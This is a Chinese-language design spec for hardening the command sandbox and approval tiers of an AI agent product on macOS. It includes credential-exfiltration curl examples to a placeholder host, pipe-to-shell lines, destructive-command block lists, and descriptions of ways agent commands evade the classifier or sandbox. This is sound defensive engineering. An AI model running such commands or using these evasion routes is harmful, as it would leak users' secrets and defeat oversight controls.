# S2a 收紧沙箱；命令「沙箱优先」三层

| 项 | 内容 |
|---|---|
| 道 | ②Main |
| 版本 | v0.1.63 |
| 分级 | 必须（兑现 v0.1.61 发布说明「更少的命令卡」，D14；补更正 E11 的沙箱口子） |
| 依赖 | F4a、C1；S3 先合更稳（见风险） |
| 合并位置 | 两个 PR，S2a-1 先合，S2a-2 不能先于它。都在 C2c、C4 之后（三张都动 `server/services/approvals.py` 和 `server/ws/arslan.py` 的命令阶梯，先删后改）；S2b、S4a、S5 之前。改 `server/orchestrator/tool_loop.py`、`server/services/task_service.py`：热修版 v0.1.62 发布前这两个文件不接别的 PR；有 K 线 PR 开着就排在它后面 |
| 推动的门槛 | D14 第一条承诺；§5.3 第 9 条；附录 A「危险命令识别」→ 追平；M2「卡片数（按种类）」中的命令卡下降 |
| 分支 | `claude/0162-s2a1-sandbox`（S2a-1）、`claude/0162-s2a2-command-layers`（S2a-2） |
| 迁移号 | 无 |

## 实测与实施记录（S2a-1，②Main，2026-10-20）

**写代码前的实测**（只读 osascript，只记退出码和错误号，不记列表名）：

| 配置 | 提醒事项 `count lists` | 访达 `count windows` |
|---|---|---|
| 沙箱外（不包） | 成功 | 成功 |
| 只有 `(version 1)(allow default)` | -10004 privilege violation | -10004 |
| 今天的工作区配置（没有 Apple Events 规则） | -10004 | — |
| `(allow default)` + `(deny appleevent-send)` | -600「Application isn't running」 | -600 |

结论：在这台 macOS 上，**只要套了 sandbox-exec，Apple Events 对任何 App 都发不出去**，和配置里有没有那条规则无关。所以第 1 条「卡批准后这一次运行去掉这条」做不到：去掉规则也照样 -10004。

**决定 U11（用户 2026-10-20 选 A，⓪Plan 转达）：** 批准了的 Apple Events / Shortcuts 卡，那一条命令不套沙箱、只这一次、从不记住，和今天一样；其他沙箱外的命令套最小配置。和 Claude Code、Codex 一致。

**U11 落地时收窄了几处（⓪Plan 定，③Hands 审过范围；用户可以放宽）：**
- 只有「一条干净的调用」才不套：整条命令就是一个 osascript（脚本写在 `-e` 或 here-doc 里，shell 不会先展开或先跑别的），或者就是一个 `shortcuts run <名字>`（可带输入、输出文件）。
- 先查 Hands 的「永不碰」名单（`never_touched`，和 `mac_applescript` 一样，在 `script_kind` 之前）：脚本点名的 App 有一个在名单上（例如 1Password），就不套沙箱这条路走不通。
- osascript 的脚本要由 Hands 自己的 `script_kind` 判成普通的 `app` 脚本才不套。判成别的都照样套沙箱，Apple Events 发不出去，提示改用 `mac_applescript`（它的卡把整段脚本给用户看）：
  - `money`（付款字样）、`app_risky`（删除、发送、提交字样；作用到别处的写法：`do shell script`、`run script`、«原始事件»、AppleScriptObjC、写文件、`keystroke`、`move` 等；高影响面的 App：System Events、访达、终端、iTerm、系统设置、脚本编辑器）；
  - `opaque`（没写明对哪个 App）；
  - D4 自己的 `_OSA_ELSEWHERE` 也照样排除。
  - 访达也排除：显示文件用 `open -R` 就行，不需要 Apple Events；访达脚本能移动、删除文件。
- **这种卡只在发起的窗口里批准（v0.1.63）**：手机和灵动岛可以拒绝，不能批准（手机的「好」被吞掉，收件箱和灵动岛的「好」是「到 Arslan 里批准」）。标记打在会导致「不套沙箱」的那张卡上（按卡上的命令算），不是打在规则上。v0.1.64 候选：手机卡能显示整段脚本以后再放开。
- **为什么：** 不套沙箱时，这类脚本就是一个不受任何限制的 shell，连 Arslan 自己的数据都挡不住；而走「批准 Apple Events 卡」这条路，今天这类脚本本来也跑不通（今天批准后是在沙箱里跑）。
- **一个变化要说明：** 沙箱外重跑卡（`outside_sandbox: true`）批准的、带 `do shell script` 的 osascript，S2a-1 之前是不套沙箱跑的，之后套最小配置（它的 Apple Events 发不出去，`do shell script` 能跑但碰不到 Arslan 的数据）。测试和基准题里没有依赖这一点的：`git grep "do shell script"` 只在 D4、Hands、灵动岛和基准的测试里出现，都是「这类脚本要多问 / 不算已知失败」的断言，没有一条要求它在沙箱外跑通。
- **用户想放宽时：** 改 `task_service.unwrapped_once` 的判断（例如让访达也能不套），或者继续让 Hands 的 `mac_applescript` 管这类脚本（今天就是）。手机批准见上一条的 v0.1.64 候选。
- **快捷指令的卡写明「它以你的身份在沙箱外运行，Arslan 看不到快捷指令做了什么」**（③Hands：`shortcuts run` 看不进去）。

**S2a-1 各条的实际做法：**
1. 工作区配置加 `(deny appleevent-send)`（纵深防御：这台机器上本来就发不出去，规则让错误号变成 -600，别的系统版本上也挡）。被挡时的提示照实说：沙箱里发不出 Apple Events；把 AppleScript 单独作为一条 run_command（会问用户，批准的在沙箱外跑），或用 `mac_applescript` / `desktop_*`；不再让用户去「系统设置 → 自动化」（D4 那句提示在沙箱外对，在沙箱里是错的，这里一并改正）；不出「沙箱外重跑」卡。D4 的「已知失败」也认沙箱（和最小配置）下的 -600。
2. 本轮读过外部内容后：凡是套着配置跑的命令一律断网（内核规则）——沙箱里，以及沙箱外的最小配置里（卡的第 4 条本来就写了「第 2 条的断网规则」；内部安全审查找到的漏洞：一个读密钥的脚本在沙箱里被挡，用户批准「沙箱外重跑」，它就在沙箱外带着网络和可读的密钥跑了）。看得出要联网的（文字，或模型传 `network: true` 加理由）先出卡，权限种类 `network`，目标 `network:*`，不给「总是」，灵动岛不能答；沙箱里可选「这一次 / 本对话」，沙箱外只给「这一次」、已存的授权不算。「沙箱外重跑」时按沙箱外重新判一次，沙箱里存的授权带不过去。没人可问：断网跑并在结果里写明。不套沙箱的那一条（U11）不涉及网络；seatbelt 起不来时什么都不包，只剩卡。**代价：** 读过网页以后，沙箱外的 `git push`、`brew install` 这类文字上看不出联网的命令会断网失败，模型要带 `network: true` 再要一次，用户看到一张「这一次」的卡。
3. 受保护路径拆成 `arslan_protected()` 和 `user_secrets()`（卡上那些凭据和浏览器配置都加了），`default_protected()` 是两者之和。读文件工具（`file_tools`）也用它，所以也读不到这些凭据了。
4. 最小配置（U11 之后放行）：`(allow default)`、禁 Apple Events、该断网时断网、拒读写 `arslan_protected()`（文件和 socket），不拒 `user_secrets()`；本对话的工具输出副本照样能读。取代 `terminal_exec.offline_wrapper`。`code_sandbox._SEATBELT_PROFILE` **保留**：`SeatbeltBackend.wrapper()` 不传配置时还用它。seatbelt 起不来时沙箱外照旧不包。
5. 工具输出副本按文件放行：每个对话最近 64 个，只在内存里；`literal` 规则写在拒受保护路径之后；目录本身不放行；没放行的副本被挡时指向 `read_file`，不出卡。

## 目标

第③层「其余在沙箱里直接跑、不出卡」，前提是沙箱挡得住。今天的配置是 `(allow default)`，只管写文件（`server/services/command_sandbox.py:115-141`），网络、Apple Events、XPC 全开（更正 E11）。所以先收紧沙箱（S2a-1），再换三层（S2a-2）。

### S2a-1 收紧沙箱

1. **挡 Apple Events。** 工作区配置加 `(deny appleevent-send)`。脚本里调 osascript（例如 `python3 x.py`）从此发不出去（F4a 交过来的那一半）。
   - 第②层的卡批准后，这一次运行去掉这条（osascript、`shortcuts run`、发信、发消息都要它）。
   - 被挡时报 -1743（「Not authorized to send Apple events」）。结果里告诉模型：要驱动别的 App，直接用 `osascript`，会出卡。不出「沙箱外重跑」卡，沙箱外也挡（见 4）。
2. **本轮读过外部内容后，命令断网；看得出要联网的，先出卡。**
   - 判据：`untrusted.external_seen()`（`server/orchestrator/untrusted.py:81-83`）。
   - 断网用现成的 `profile(offline=True)`（`command_sandbox.py:123-124`，`(deny network*)`），由内核挡。
   - 先出卡的：文字命中 `untrusted._NETWORK_COMMAND`（`untrusted.py:52-54`），或模型传 `network: true` 加一句理由。卡给「这一次 / 本对话」，目标 `network:*`，灵动岛不能答。**命令在沙箱外跑时（S4a 的「本对话」出沙箱授权；S5 的完全访问；或沙箱设置关着、第③层 `unsandboxed:*` 的本对话授权），这张卡只给「这一次」，已有的 `network:*` 本对话授权也不算数**：两种「本对话」叠在一起时，`curl "https://x/?k=$(cat ~/.aws/credentials)"` 是 GET，不进第②层，联网已批，沙箱外又读得到凭据，全程不出卡。沙箱里跑的照旧可给「本对话」：沙箱里读不到凭据目录。
   - 没人可问（定时任务）：断网跑，不出卡，结果里写明。
   - **为什么两样都要：** 只问，文字看不见脚本里的联网，换个写法就绕过；只断网，`curl`、`git clone`、`pip` 会静默失败，模型乱试。内核兜底，正常要联网时一张卡。Codex 的 workspace-write 也是默认断网、要联网再批。
   - 读网页本来就该用 `web_extract`。沙箱说明（`note()`，`command_sandbox.py:179-188`）里写这一句。
3. **受保护路径补全**（`default_protected()`，`command_sandbox.py:88-103`）：
   - 凭据：`~/.aws`、`~/.config/gcloud`、`~/.kube`、`~/.docker/config.json`、`~/.netrc`、`~/.npmrc`、`~/.pypirc`、`~/.config/gh`、`~/.git-credentials`、`~/.gnupg`、`~/.azure`；
   - 浏览器配置：`~/Library/Application Support/` 下的 `Google/Chrome`、`Firefox`、`BraveSoftware`、`Microsoft Edge`、`Arc`，以及 `~/Library/Safari`、`~/Library/Cookies`。
   - 数据目录早就在（`:93-94`，更正 E4）。
   - 拆成两份：`arslan_protected()`（数据目录、`~/.arslan`、两个钥匙文件、Hands 文件夹）和 `user_secrets()`（`~/.ssh`、钥匙串和上面这些）。`default_protected()` 返回两份之和，现有调用方不变：工作区配置、能力沙箱（`server/services/capability_sandbox.py:63-65`）。
4. **出了沙箱也套一个最小配置**，取代 E4 的「按命令文字拦数据目录」（换个写法就绕过了）。
   - 点了出沙箱、或沙箱设置关着时，命令照样经 `sandbox-exec`：`(allow default)`、`(deny appleevent-send)`、第 2 条的断网规则、拒读写 `arslan_protected()`（文件和 socket）。
   - **不拒 `user_secrets()`。** 这一点和审查 §3 S2a 的字面不同：`ssh`、`git push`、`gh`、`aws` 正是靠「沙箱外重跑」拿到 `~/.ssh` 和凭据。出了沙箱也拒，它们就永远跑不了。被取代的 E4 规则也只管数据目录。
   - 它取代 `terminal_exec.offline_wrapper`（`server/services/terminal_exec.py:77-81`、`:103-108`），删掉；`code_sandbox._SEATBELT_PROFILE`（`server/services/code_sandbox.py:45`）随之没人用，也删（删前 grep）。
   - seatbelt 起不来时没有配置可套，按 S2a-2 第③层出卡。
5. **本对话拿到过路径的工具输出副本，命令可以只读**（⓪Plan 10-20 跑分发现；③Hands 审定范围）。
   - 现状：
     - 大的工具结果存在 `<data_dir>/tool_outputs/`：任何工具超过 8000 字的结果（`tool_loop.py:345-353`），加上长的命令输出（`terminal_exec.py:206-211`）。结果里写了用 `read_file` 读。
     - 但模型常用 `run_command` 读：`cat …`，或在 python here-doc 里 `json.loads`。数据目录受保护，命令被挡，用户看到「沙箱外重跑」卡。这张卡让人看不懂，答应了给出去的又远多于读一个副本。
     - 10-20 跑分里 3 格出现（T2，DeepSeek，每轮多次）。
     - 第 4 条落地后，出了沙箱也拒数据目录，答应了也读不到。
   - **不能整个目录放行。**
     - 这个目录是所有对话共用的，保留 7 天（`tool_outputs.py:25`、`:31-50`）。里面有网页正文，MCP 的邮件和日历，Hands `desktop_look` 读到的别的 App 窗口文字，`read_file` 读过的文件（包括后来关掉的桌面、文稿、下载里的），命令打出来的东西，以及临时对话、「不记忆」对话和 iPhone 对话的副本。
     - `read_file` 读得到但列不出来（`file_tools.py:152-154`）。文件名带 8 位随机十六进制，所以一个路径实际上就是按对话给的凭证。
     - `subpath` 放行会让沙箱里的命令 `ls` 再 `cat *`，读出 7 天里所有对话的副本。沙箱不挡网络，沙箱里的脚本又不出卡，读出来就能发出去。
   - **改法：一个文件一个文件地放行，做法同 `read_file`。**
     - `tool_outputs.save()` 的调用方每存一个副本，就把路径记进这个对话的集合，只在内存里。两处调用方：`tool_loop.py:345-353` 和 `terminal_exec.py:206-211`。
     - 集合封顶，例如每个对话最近 64 个，配置不会无限变长。
     - 生成沙箱配置时，对集合里每个文件加 `(allow file-read* (literal "…"))`。这条写在拒受保护路径那条之后：今天 `profile()` 对数据目录 `deny file-read* file-write*`，并且写在最后，因为后写的规则胜出（`command_sandbox.py:88-103`、`:118-121`）。
     - 目录本身不放行，`ls` 列不出来。两份配置（工作区、出沙箱的最小配置）都只这样开，不用 `subpath`。不开写。
     - 集合里没有的副本（别的对话的，或者重启后），命令照样被挡。被挡时结果里告诉模型用 `read_file`，不出「沙箱外重跑」卡。
     - 实施要点（③Hands 审）：
       - 每条 `literal` 用解析后的真实路径生成，并像 `command_sandbox.py` 里其他规则一样用 JSON 加引号（`_real`、`_rule`）。seatbelt 按真实路径匹配，加引号防注入。
       - 「被挡时指向 `read_file`、不出卡」只管 `tool_outputs/` 下的路径。别的受保护路径被挡，照现在的处理。

### S2a-2 三层（⓪Plan 提案 §5.1；总计划 S2）

**① 禁止层：永不跑，出不出沙箱都一样。**

- 现有 4 条 `_FORBID`（`server/services/terminal_policy.py:40-53`）。
- Hermes 硬黑名单里适用于 macOS 的，改写成 Arslan 自己的规则。今天经 `hermes.detect_hardline_command` 调用（`:117-119`），原文在 `arslan/vendor/hermes/approval_detection.py:92-125`。要搬的：
  - 递归删 `/`、`~` / `$HOME`、系统根目录（并进现有的 `macos-roots`）；fork bomb；`kill -1`；`shutdown`、`reboot`、`halt`；
  - 写原始磁盘：`dd of=` 或重定向到 `/dev/disk*`、`/dev/rdisk*`；`diskutil erase*` / `zeroDisk` / `secureErase` / `partitionDisk`；`newfs_*`。
  - 只适用于 Linux 的不搬：`init 0/6`、`systemctl`、`telinit`、`/dev/sd*` 等。

**② 对外 / 删除清单：只给「这一次」，从不记住，忽略已存的「总是」。** 卡的种类仍是 `command`，请求带 F4a 的 `once_only=True`。F4a 只放了两条，本卡扩成整张清单；F4a 认命令名的写法（带路径、`command`、`xargs`）用到每一条。

| 组 | 规则（名字沿用 `_ASK`，`terminal_policy.py:54-77`；新增的标 *） |
|---|---|
| 发出去 | `send-mail`、`send-message`、`upload`、`remote-shell`、`git-push`、`publish` |
| 删除 | `delete-outside`*：rm / rmdir / unlink / trash / srm 的目标不在工作文件夹里，或看不出目标；`force-kill`*：`kill -9`、`killall`、`pkill` |
| 改系统 | `login-items`、`keychain-write`*：`security add-*` / `delete-*` / `import`；`system-settings`*：`tccutil reset`、`networksetup -set*`、`systemsetup -set*`、`pmset`、`spctl`、`scutil --set` |
| F4a 已有 | `apple-events`、`shortcuts` |

- **「发出去」补全写法**（F2 交过来，各有测试）：`curl --request=POST`、`-XPOST`、`--data=…`、`--json`；`gh api` 带 `-f` / `-F` / `--field` / `--raw-field` / `--input`，或非 GET 的 `-X` / `--method`；HTTPie / xh 的 `http POST …`、或带 `键=值` 数据项。今天 `upload` 只认 `--request POST`（`:61-63`），`publish` 只认 `gh api … -X POST`（`:69`）。
- 种类不换成 `send` / `destructive` / `system`（`approvals.py:301-307` 的注释）：那是卡片界面大合并，v0.1.64 候选。
- **规则名不改。** M1 的驱动按名字答卡（`scripts/kernel_bench/arslan_driver.py:37`、`:102-111`）；`task_service._OUTBOUND_RULES`（`server/services/task_service.py:51-52`）也按名字判断。新增的名字告诉 ⓪Plan。

**③ 其余：沙箱可用就在沙箱里直接跑，不出卡。**

- 被沙箱拦下时，照旧出一次「沙箱外重跑」卡（`tool_loop.py:1283-1290`）。
- **读不懂的命令问一次**（规则名 `unreadable`，同样 `once_only`）：引号不配对、超过解析上限；`eval`、`source <(…)`；把网络或解码结果管道给 shell（`curl … | sh`、`base64 -d | sh`）；内联脚本里有联网、起进程、驱动 App 的字样（沿用 `_SCRIPT_REACH`，`terminal_policy.py:178-189`）。
- **R4：免卡前必须 `command_sandbox.available()`（`command_sandbox.py:155-168`）为真。** 今天只看设置（`_sandbox_enabled`，`tool_loop.py:909-917`，用在 `:1057`、`:1081`）；seatbelt 起不来时 `wrapper` 返回 None，命令照样跑（`terminal_exec.py:101-102`）。
- 沙箱关着或起不来时，第③层也出卡（种类 `command`）：「这一次」或「本对话」，目标 `unsandboxed:*`。
- 谨慎模式（`ask_all`）照旧：每条都出卡，目标 `text:<原文>`。S5 再收成一个模式设置。

### S2a-3 补洞：「直接跑」要靠读懂挣来（③Hands；v0.1.63 发布前必须合；⓪Plan 2026-10-22 加）

②Main 审 S2b-1 #320 时发现、⓪Plan 在 main `97082c99` 上用 Opus 5.5 复现：第③层是「①②两层都没认出来」时的默认值（`terminal_policy.py:419-439`）。拆词和 shell 对不上时，本该出卡或禁止的命令会落进「直接跑」。对照已发布的 v0.1.62，大部分是 S2a-2 带进来的退步（v0.1.62 对这些都出卡），还没发给用户。

**要补的四类（具体复现见 #320 上 ②Main 的审查，修复 PR 里写成测试）：**
- shell 的引号写法拆错（`$'…'` 一类），让后面的命令看起来像在引号里；
- zsh 的前缀修饰词和 glob 限定符被当成普通参数，后面真正要跑的命令没被认出来；
- 包了一层的解释器（shell 的 `-c` 里再套脚本解释器，`node` 的 `-p` / `--eval`）；
- 解析耗时随长度平方增长，又在事件循环上跑（v0.1.62 也有）：要有上限或限时，超了按「读不懂」出卡，并移出事件循环。

**怎么改（用户 2026-10-22 定，按云端审计的方案，④参谋转；替换原来的要求）：** 只做结构性防守，不手写逃逸样例。

- **a 换成 `/bin/bash -c` 执行**（今天是不带 `-f` 的 `zsh -c`，每条命令先读用户的 `~/.zshenv`）。子进程环境去掉 `BASH_ENV`、`ENV` 和 `BASH_FUNC_*`；`child_environment` 保持白名单，并为这几个变量加测试。对照测试用和产品同一个 bash（Mac 上是 `/bin/bash` 3.2），macOS CI 也跑。bash 也有自己的引号写法，a 只去掉 zsh 特有的那一类，其余靠 c。
- **b 沙箱挡不住的程序分两档：**
  - 名字独特的（`launchctl`、`crontab`、`shortcuts`、`tccutil`、`networksetup`、`osascript`、`killall`，以及 `security` 的写类子命令）：出现在任何位置都出卡。
  - 常见词（`open`、`at`、`batch`）：只在判定识别出的命令位置上匹配；读不懂的交给 c。
  - 在 37,738 条语料上量出卡率前后的变化，和 bench 的「等你」一起看。
- **c 读不懂、太长、超时一律出卡：** 「读懂」按白名单定义，判定只认它完整建模过的语法，别的引号形式、展开形式、嵌套解释器都算读不懂。解析放到事件循环之外、带时限，超时也算读不懂（②Main 在 #356 里量到：检测文本的构造随行数平方增长，又同步跑在事件循环上）。无人值守时读不懂就拒绝、进收件箱（S1b 的路）。
- **d 测试：** 保留和 v0.1.62 的差分，但它不够（v0.1.62 自己也漏）。再加两样不需要手写逃逸样例的：
  - **真 shell 对照：** 语料里每条命令放进真 bash 执行，`PATH` 里的程序全换成只记录「我被调用了」的桩程序；shell 实际调用的程序层级高于判定的，算失败。每条命令在一次性的临时文件夹里跑，空环境、断网、带时限，碰不到真的主目录和网络。
  - **自动变形：** 对语料里每条命令机械地套上各种引号、前缀、包装，再跑上面的对照。
- **e 真机上不演示逃逸**，只做正向回归：沙箱仍然挡住工作区外写入、Apple Events 和受保护路径。
- **f 只对无人值守的定时任务：** `run_command` 只放行只读白名单，写文件仍走 `write_file`（只在 `~/Arslan`）；S1b 里 `schedule_task` 说明的「run sandboxed commands」相应收窄。聊天里保持 a–d。只有 a–d 到 R63 前做不完，才把 f 整体当临时兜底，等 v0.1.64 默认拒绝的沙箱上线后撤掉。
- 安全代码在 Opus 5.5 上写；②Main 用 effort=max 审，⓪Plan 复核。具体的复现写法只放在测试和 PR 评论里。

**验收（R63 门槛）：** a + b（两档）+ c + d（含真 shell 对照和自动变形）+ 出卡率不退步（bench「等你」仍为 0）+ ②Main 的 effort=max 复审；变异；全量；CI。PR 按 a+c → b → d → f 拆，每个不超过约 800 行。

**合并位置：** S 线里排在 S4a、S7 前面，紧跟 S2b-1；R63 之前必须合。

## 开放问题（S2a 设计时定）

**沙箱里不出卡、却能在沙箱外起作用的命令**（③Hands 审 #242 时发现，⓪Plan 2026-10-21 转来；详情见 #242 评论 6277226869）：

| 命令 | 为什么 seatbelt 挡不住 |
|---|---|
| `open -a Terminal`、`open https://…` | 经 LaunchServices 启动，起来的 App 不在沙箱里 |
| `networksetup -setdnsservers …`、`tccutil reset All` | 经系统守护进程执行，不是沙箱里的进程自己写文件 |
| `killall Finder` | 直接作用于沙箱外的进程 |
| `screencapture`、`pbpaste` | 今天判定为「直接跑」，读的是屏幕和剪贴板 |

- 它们和 `launchctl`、`crontab`、`defaults write` 是同一类。后三个归在 `login-items`，已经会问。
- 工作区配置是 `(allow default)`，`mach-lookup` 全开，所以经守护进程的这一类都挡不住。
- 要定的：这几类进第②层（出卡、只给「这一次」），还是在配置里关掉相应的 `mach-lookup`。实测之前不写结论。
- 第③层「沙箱里直接跑」的前提，就是沙箱挡得住，这个口子正好在那条前提上。

- **历史里有一套没接线的 git 外联允许清单**（③Hands 审 #247 时提醒）。
  - `command_policy` 的 `is_network_command`、`resolve_target_host`、`is_host_allowed`、`push_targets_current_branch`：只许 GitHub 和本仓库的远端，`git push` 只许推当前分支。
  - 0.1.48 起就没有调用者，C2e-1（#247）删了。S2a 设计联网卡时如果用得上，可以从 git 历史拿回。

## 改哪些文件

- **S2a-1：**
  - `server/services/command_sandbox.py`：`profile` 加 `appleevents` 参数；两份受保护名单；新增最小配置；`stopped_by_sandbox`（`:171-176`）认 -1743。
  - `server/services/terminal_exec.py`：`run` 按「在沙箱里 / 最小配置 / 断网 / 放开 Apple Events」四个开关组前缀；删 `offline_wrapper`。
  - `server/orchestrator/tool_loop.py`：`run_command` 分支（`:1042-1100`）加断网判断和联网卡；`OFFLINE` 照旧由收尾阶段设（`:2504`）。
  - `server/registry/executors.py:808-812`：把开关传下去。
- **S2a-2：**
  - `server/services/terminal_policy.py`：三层判断。`assess`、`ask_rules`、`risk_grade`、`describe` 保留。`runs_freely_in_sandbox`（`:192-210`）并进第③层；`standing_allows`（`:164-169`）不再被判断路径读。Hermes 的文本规整（`_detection_texts`，`:89-94`）仍可用，S2b 换掉。
  - `server/orchestrator/tool_loop.py:1042-1100`：按三层走；R4。**免卡只在这里判一次。**
  - 两条命令阶梯 `server/ws/arslan.py:550-598`、`approvals.py:484-521`：被叫到就出卡，不再用 `may_skip_card`（`server/ws/arslan.py:66-80`）跳过；删掉 `standing` 分支（`server/ws/arslan.py:590-592`、`approvals.py:514-517`）。
  - `approvals._command_request`（`approvals.py:560-575`）：第②层和 `unreadable` 走 `once_only`；第③层出卡时目标 `unsandboxed:*`；联网卡 `network:*`；谨慎模式 `text:<原文>`。
  - `approvals.py:280-281` 的 `_ISLAND_RISKY_RULES`：从 `terminal_policy` 引用第②层全集加 `unreadable`、`network`，不再手抄。灵动岛按规则判断命令卡（`:327-333`）。
  - `task_service.py:51-52`：`_OUTBOUND_RULES` 改为引用「发出去」组加 F4a 那两条。F2 在热修里临时加的 `_OUTBOUND_EXTRA`（`curl --request=POST`、`gh api -f` 等写法）收进「发出去」组以后删掉（F2 卡写的删除条件）。
- **F4a 卡列出的、今天仍不出卡的写法，本卡逐条补测试：** `$(which osascript)`、`open "shortcuts://run-shortcut?…"`、带路径或 `command` 前缀的其它规则（`/usr/bin/curl -d`、`/usr/bin/git push`、`command git push`）。`(deny appleevent-send)` 挡不挡得住 `open` 拉起别的 App，在 Mac 上实测后写进 PR。
- **F2、F4a 审查实测、今天仍判成 `run` 的写法，也逐条补测试（更正 E17）：**
  - osascript 前面带东西：`FOO=1 osascript`、`/usr/bin/env osascript`、`env -i osascript`、`nice` / `timeout` / `caffeinate` / `xcrun` / `arch` 开头、`exec -a NAME osascript`、`builtin command osascript`、`eval osascript`、`find … -exec osascript {} \;`、`parallel osascript`、`s=osascript; $s`。`(deny appleevent-send)` 从机制上盖住它们，测试要证明这一点，不必每种写法都加文字规则。
  - 对外：`http … DELETE url`、`http --form url f@file`、`cat d.json | http url`、`http url < d.json`、`gh api … -ftitle=x`、`wget --method PUT`（中间是空格）、`curl -sXDELETE`；以及没有任何规则的 `docker push`、`aws s3 cp`、`terraform apply`、`kubectl apply`、`vercel deploy`，放进「发出去」组或写明为什么不放。
  - `terminal_policy.py:65` 的 rsync 正则（`\S+:)\b` 要求冒号后面是单词字符）漏掉 `rsync -a d host:/d`，本卡修掉。
- **测试：** `tests/server/test_terminal_policy.py`、`test_sandbox_script_cards.py`、`test_approvals_v2.py`、`test_terminal_offline.py` 里断言旧行为的改掉；从 3a 分支（`claude/0161-terminal-categories`）的 `tests/server/test_terminal_categories.py` 挑实测过的命令做回归。

## 不许碰

- 不合并 3a 分支（4,930 行的解析器），只拿用例。`arslan/vendor/hermes/**` 留给 S2b。
- Bridge 帧格式：种类仍是 `command`，手机按命令文字给风险词（`desktop/bridge/Sources/BridgeCore/FrameMapper.swift:135-140`、`:218-228`），只答第一项。不用改 Swift。
- Mach / XPC 服务：不整体挡（大多数程序起不来）。
- 出沙箱卡走 `decide()`（S4a）；「允许的文件夹」（S4b）；模式设置（S5）。

## 怎么做（要点）

1. 先把今天的行为钉成表格测试，再改：每条规则至少一条「问」、一条「不问」。
2. 一条命令同时命中几条规则时，目标列出全部规则（`rules:<规则>|<规则>`，`approvals.py:565-571` 的说明）。同时要出沙箱和联网的，只出一张卡，卡上两件事都写。
3. 已存的 `legacy_rule`「总是」不删数据，只是不再被读。
4. **在 Mac 上实测新配置**，PR 里贴结果：`open`、`pbcopy`、`say`、`swift build`、`npm install`（联网卡批准后）、`git status`；`(deny appleevent-send)` 是否挡住 `python3` 里的 osascript。
5. 用 3a 的实测命令回放，PR 里贴三层各占多少。
6. **留着的旧路径，代码注释写删除条件：** Hermes 文本规整写「S2b 删（v0.1.63）」；`terminal_policy.always_allowed` 写「S6 合并时删」。

## 验收

- **测试（S2a-1）：**
  - 沙箱里 `python3` 调 osascript 失败（`macos` 标记）；第②层卡批准后的 `osascript` 能跑；
  - 本轮有 `web_search` 后：`curl https://x/?q=$(cat ~/.config/gh/hosts.yml)` 出联网卡，且读不到 `hosts.yml`；`python3` 里用 urllib 联网失败；没读外部内容时照常联网；
  - 出了沙箱的命令读不到数据目录（`macos` 标记），但能读 `~/.ssh`；
  - 工具输出副本（`macos` 标记，沙箱里和出了沙箱各测一遍）：
    - 读得到本对话结果里给过路径的副本；
    - 读不到别的对话的副本；
    - `ls <data_dir>/tool_outputs` 被拒；
    - 副本写不进；
    - 路径里带引号或括号的副本，生成的规则仍是一条带 JSON 引号的 `literal`，读得到它、读不到别的；
    - 命令读 `tool_outputs/` 下集合外的副本被挡时，结果指向 `read_file`、不出卡；读别的受保护路径被挡时，处理和现在一样；
  - 联网卡的范围：本轮有 `web_search` 后，在沙箱里对联网卡答「本对话」，同一对话下一条沙箱里的联网命令不再出卡；再拿到出沙箱的「本对话」授权后，或者沙箱设置关着、对第③层 `unsandboxed:*` 答过「本对话」后（S5 合并后再加一种：完全访问），`curl "https://x/?k=$(cat ~/.aws/credentials)"` 照样出联网卡，卡上只有「这一次」；
  - 新加的凭据和浏览器目录在沙箱里读不到。
- **测试（S2a-2）：**
  - 每条禁止规则都拒；第②层每条只给「这一次」，已存的「总是」不生效，灵动岛不能答；
  - F2 交来的每种「发出去」写法都进第②层；
  - 第③层：沙箱可用时不出卡；`available()` 为 False 时出卡（R4 回归）；读不懂的命令出卡，只给「这一次」。
- **PR 里贴：** 3a 实测命令按三层的分布；M1 里受影响题目的前后对比（命令卡直接影响跑分）。
- **M2（装上后 7 天）：** 命令卡明显下降；联网卡和「沙箱外重跑」卡的数量单列。

## 量级

- S2a-1：产品代码约 +200 / −40 行。
- S2a-2：约 +350 / −250 行。

## 风险与回退

- **工作文件夹里的 `rm -rf`、`git reset --hard` 不再出卡**，只靠沙箱和 S3 的撤销。S3 先合更稳；S2a-2 先合的话，发版前必须有 S3（§5.3 第 8 条）。
- **联网卡可能偏多：** `external_seen()` 把 `read_file` 也算外部内容（`untrusted.py:50-51`），读过文件后的 `npm install` 也会问。M2 看数量；多了，v0.1.64 候选：只算网页和 MCP，或按域名放行（领先路线里的「网络出口控制」）。
- **凭据目录挡了读：** 沙箱里的 `aws`、`kubectl`、`gh`、`docker`，有 `~/.npmrc` 时的 `npm`，会出「沙箱外重跑」卡。靠 `gh` 登录的能力（能力沙箱共用名单）也读不到。M2 若多，v0.1.64 再细分。
- **XPC 仍开着：** 脚本里调 `shortcuts` 可能不经 Apple Events。能否按服务名挡，实测后记进 v0.1.64 候选。
- **沙箱关着的用户**，每段对话多一张「不进沙箱」卡；想完全不问，用 S5 的「完全访问」。
- **留着的旧东西和删除条件：** Hermes 文本规整：S2b 删（v0.1.63）；`terminal_policy.always_allowed` 和旧面板：S6 合并时删，S6 顺延就在 v0.1.64 删；库里的 `legacy_rule` 行：S6 页面能删，统一清掉的迁移在 S6 上线一个版本后做（v0.1.64 候选）。
- **回退：** S2a-2 在 S2b 合并前可整个 revert。S2a-1 单独 revert 会让第③层失去前提，所以要和 S2a-2 一起退。
